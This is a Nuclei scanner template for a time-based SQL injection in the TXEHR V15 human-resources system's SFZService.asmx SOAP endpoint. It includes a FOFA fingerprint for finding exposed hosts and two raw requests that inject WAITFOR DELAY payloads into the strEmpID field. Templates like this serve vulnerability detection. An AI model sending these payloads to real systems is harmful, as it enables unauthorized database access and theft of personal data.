common/config/pocs/nuclei-2025/同享人力资源管理系统-TXEHR-V15-SFZService.asmx-SQL延时注入漏洞.yaml

id: tongxiangHR-TXEHR-V15-SFZService_asmx-sql

info:
  name: 同享人力资源管理系统-TXEHR V15 SFZService.asmx SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/Assistant/Default.aspx"
    同享人力资源管理系统-TXEHR V15 SFZService.asmx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486815&idx=1&sn=f0f94a18f1ba06fdb291fdafb2311678&chksm=c267b86cf510317ad3dacb85e241cefa41d197d9f75365b7ec553b5cb907ebe27874a85c46df&token=522460222&lang=zh_CN#rd
  tags: sql injection


  
http:
  - raw:
      - |
        POST /Service/SFZService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
          <GetJianLiByEmpID xmlns="http://tempuri.org/">
           <strEmpID>1';WAITFOR DELAY '0:0:4'--</strEmpID>
          </GetJianLiByEmpID>
         </soap:Body>
        </soap:Envelope>
      - |
        POST /Service/SFZService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
          <GetJianLiByEmpID xmlns="http://tempuri.org/">
           <strEmpID>1';WAITFOR DELAY '0:0:8'--</strEmpID>
          </GetJianLiByEmpID>
         </soap:Body>
        </soap:Envelope>

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and





